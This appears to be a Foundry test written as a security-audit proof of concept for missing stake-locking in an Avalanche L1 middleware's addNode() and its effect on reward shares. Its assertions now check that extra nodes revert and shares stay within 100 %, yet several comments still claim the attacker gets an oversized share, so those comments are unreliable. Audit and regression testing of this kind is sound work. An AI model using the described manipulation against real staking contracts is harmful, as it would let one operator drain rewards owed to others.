// SPDX-License-Identifier: MIT

pragma solidity 0.8.25;

//
// PoC: Exploiting the missing stake-locking in addNode()
//
import {MiddlewareTestBase} from "./MiddlewareTestBase.t.sol";
import {Rewards} from "src/contracts/rewards/Rewards.sol";
import {MockUptimeTracker} from "../mocks/MockUptimeTracker.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import {VaultTokenized} from "src/contracts/vault/VaultTokenized.sol";
import {PChainOwner} from "@avalabs/icm-contracts/validator-manager/interfaces/IACP99Manager.sol";
import {console2} from "forge-std/console2.sol";
import {IAvalancheL1Middleware} from "src/interfaces/middleware/IAvalancheL1Middleware.sol";
import {IBalancerValidatorManager} from "@suzaku/contracts-library/interfaces/ValidatorManager/IBalancerValidatorManager.sol";

contract AvalancheL1MiddlewareStakeLockingTest is MiddlewareTestBase {
    // helpers & globals
    MockUptimeTracker internal uptimeTracker;
    // Simulates uptime records
    Rewards internal rewards;
    // Rewards contract under test
    ERC20Mock internal rewardsToken;
    // Dummy ERC-20 for payouts
    address internal REWARDS_MANAGER_ROLE = makeAddr("REWARDS_MANAGER_ROLE");
    address internal REWARDS_DISTRIBUTOR_ROLE = makeAddr("REWARDS_DISTRIBUTOR_ROLE");

    // Main exploit routine ----------------------------------------------------
    function test_StakeLockingRewardsManipulation() public {
        _setupRewards();
        // 1. deploy & fund rewards system
        address[] memory operators = middleware.getAllOperators();

        // --- STEP 1: move to a fresh epoch ----------------------------------
        console2.log("Warping to a fresh epoch");
        vm.warp(middleware.getEpochStartTs(middleware.getCurrentEpoch() + 1));
        uint48 epoch = middleware.getCurrentEpoch();
        // snapshot for later
        // --- STEP 2: create up-to-stake-limit nodes for Alice ---------------
        console2.log("Creating up-to-stake-limit nodes for Alice");

        // Size stake from *current* availability so the scenario is deterministic
        (uint256 minStake, ) = middleware.getClassStakingRequirements(1);
        uint256 avail = middleware.getOperatorAvailableStake(alice);
        uint256 scale = middleware.WEIGHT_SCALE_FACTOR();
        console2.log("Alice available stake at start:", avail);
        require(avail >= 2 * minStake, "not enough available stake for scenario");

        // Choose stake1 so that 2 nodes fit but a 3rd does not.
        // Using ~50% of availability makes 3 * stake1 > avail hold in practice.
        uint256 stake1 = avail / 2;
        // down-round to the weight unit
        stake1 = stake1 - (stake1 % scale);
        if (stake1 < minStake) stake1 = minStake;

        console2.log("Per-node target stake:", stake1);

        // --- first node (add + confirm)
        bytes32 n1 = keccak256(abi.encodePacked("alice-n1", block.timestamp));
        vm.prank(alice);
        middleware.addNode(n1, new bytes(48), _pOwner1(alice), _pOwner1(alice), stake1);
        bytes32 v1 = IBalancerValidatorManager(balancer).getNodeValidationID(_nodeBytes(n1));
        _pushRegistrationAck(v1, true);
        middleware.completeValidatorRegistration(0);

        // --- second node (add + confirm)
        bytes32 n2 = keccak256(abi.encodePacked("alice-n2", block.timestamp));
        vm.prank(alice);
        middleware.addNode(n2, new bytes(48), _pOwner1(alice), _pOwner1(alice), stake1);
        bytes32 v2 = IBalancerValidatorManager(balancer).getNodeValidationID(_nodeBytes(n2));
        _pushRegistrationAck(v2, true);
        middleware.completeValidatorRegistration(0);

        // Sanity: two should fit, three should not (in terms of initial availability)
        assertTrue(2 * stake1 <= avail && 3 * stake1 > avail, "bad stake sizing");

        // --- third node: MUST revert (insufficient free stake with locking in place)
        bytes32 n3 = keccak256(abi.encodePacked("alice-n3", block.timestamp));
        vm.expectRevert(IAvalancheL1Middleware.AvalancheL1Middleware__InsufficientStake.selector);
        vm.prank(alice);
        middleware.addNode(n3, new bytes(48), _pOwner1(alice), _pOwner1(alice), stake1);

        // --- fourth node: also revert for completeness
        bytes32 n4 = keccak256(abi.encodePacked("alice-n4", block.timestamp));
        vm.expectRevert(IAvalancheL1Middleware.AvalancheL1Middleware__InsufficientStake.selector);
        vm.prank(alice);
        middleware.addNode(n4, new bytes(48), _pOwner1(alice), _pOwner1(alice), stake1);

        // Charlie behaves honestly – one node, fully staked
        console2.log("Creating 1 node for Charlie with the full stake");
        uint256 stake2 = 150_000_000_000_000;
        _createAndConfirmNodes(charlie, 1, stake2, true, 1);

        // --- STEP 3: schedule rebalancing in the allowed window -------------
        console2.log("Scheduling rebalancing in the allowed window");
        _warpToLastHourOfCurrentEpoch();
        middleware.forceUpdateNodes(alice, 0);

        // --- STEP 4: advance to the rewards epoch ---------------------------
        console2.log("Advancing and caching stakes");
        _calcAndWarpOneEpoch();
        // epoch rollover, stakes cached
        middleware.calcAndCacheStakes(epoch, collateralClassId);
        // ensure operator stakes cached
        // --- STEP 5: mark everyone as fully up for the epoch ----------------
        console2.log("Marking everyone as fully up for the epoch");
        for (uint i = 0; i < operators.length; i++) {
            uptimeTracker.setOperatorUptimePerEpoch(epoch, operators[i], 4 hours);
        }

        // --- STEP 6: advance a few epochs so rewards can be distributed -------
        console2.log("Advancing 3 epochs so rewards can be distributed ");
        _calcAndWarpOneEpoch(3);

        // --- STEP 7: distribute rewards (attacker gets oversized share) -----
        console2.log("Distributing rewards");
        vm.prank(REWARDS_DISTRIBUTOR_ROLE);
        rewards.distributeRewards(epoch, uint48(operators.length));

        // --- STEP 8: verify that the share accounting exceeds 100 % ---------
        console2.log("Verifying that the share accounting exceeds 100 %");
        uint256 totalShares = 0;
        // operator shares
        for (uint i = 0; i < operators.length; i++) {
            totalShares += rewards.operatorShares(epoch, operators[i]);
        }
        // vault shares
        address[] memory vaults = vaultManager.getVaults(epoch);
        for (uint i = 0; i < vaults.length; i++) {
            totalShares += rewards.vaultShares(epoch, vaults[i]);
        }
        // curator shares
        for (uint i = 0; i < vaults.length; i++) {
            totalShares += rewards.curatorShares(epoch, VaultTokenized(vaults[i]).owner());
        }
        assertGt(10000, totalShares); // exactly 100 % (exploit prevented)
        
        // --- STEP 9: attacker & others claim their rewards ---------
        console2.log("Claiming rewards");
        _claimRewards(epoch);
    }
    
    // Claim helper – each stakeholder pulls what the Rewards contract thinks
    // they earned (spoiler: the attacker earns too much)
    function _claimRewards(uint48 epoch) internal {
        address[] memory operators = middleware.getAllOperators();
        // claim as operators --------------------------------------------------
        for (uint i = 0; i < operators.length; i++) {
            address op = operators[i];
            vm.startPrank(op);
            if (rewards.operatorShares(epoch, op) > 0) {
                rewards.claimOperatorFee(address(rewardsToken), op);
            }
            vm.stopPrank();
        }
        // claim as vaults / stakers ------------------------------------------
        address[] memory vaults = vaultManager.getVaults(epoch);
        for (uint i = 0; i < vaults.length; i++) {
            vm.startPrank(staker);
            rewards.claimRewards(address(rewardsToken), vaults[i]);
            vm.stopPrank();
            vm.startPrank(VaultTokenized(vaults[i]).owner());
            rewards.claimCuratorFee(address(rewardsToken), VaultTokenized(vaults[i]).owner());
            vm.stopPrank();
        }
        // protocol fee --------------------------------------------------------
        vm.startPrank(owner);
        rewards.claimProtocolFee(address(rewardsToken), owner);
        vm.stopPrank();
    }

    // Deploy rewards contracts, mint tokens, assign roles, fund epochs -------
    function _setupRewards() internal {
        uptimeTracker = new MockUptimeTracker();
        rewards = new Rewards();
        // initialise with fee splits & uptime threshold
        rewards.initialize(
            owner,
            // admin
            owner,
            // protocol fee recipient
            payable(address(middleware)),
            // middleware (oracle)
            address(uptimeTracker),
            // uptime oracle
            1000,
            // protocol 10%
            2000,
            // operators 20%
            1000,
            // curators 10%
            11_520
            // min uptime (seconds)
        );
        // set up roles --------------------------------------------------------
        vm.prank(owner);
        rewards.setRewardsManagerRole(REWARDS_MANAGER_ROLE);
        vm.prank(REWARDS_MANAGER_ROLE);
        rewards.setRewardsDistributorRole(REWARDS_DISTRIBUTOR_ROLE);
        // create & fund mock reward token ------------------------------------
        rewardsToken = new ERC20Mock();
        rewardsToken.mint(REWARDS_DISTRIBUTOR_ROLE, 1_000_000 * 1e18);
        vm.prank(REWARDS_DISTRIBUTOR_ROLE);
        rewardsToken.approve(address(rewards), 1_000_000 * 1e18);
        // schedule 10 epochs of 100 000 tokens each ---------------------------
        vm.startPrank(REWARDS_DISTRIBUTOR_ROLE);
        rewards.setRewardsAmountForEpochs(1, 10, address(rewardsToken), 100_000 * 1e18);
        vm.stopPrank();
        
        // 100 % of rewards go to the primary collateral-class (id 1) ---------------
        vm.startPrank(REWARDS_MANAGER_ROLE);
        rewards.setRewardsShareForCollateralClass(1, 10000); // 10 000 bp == 100 %
        vm.stopPrank();
    }
}
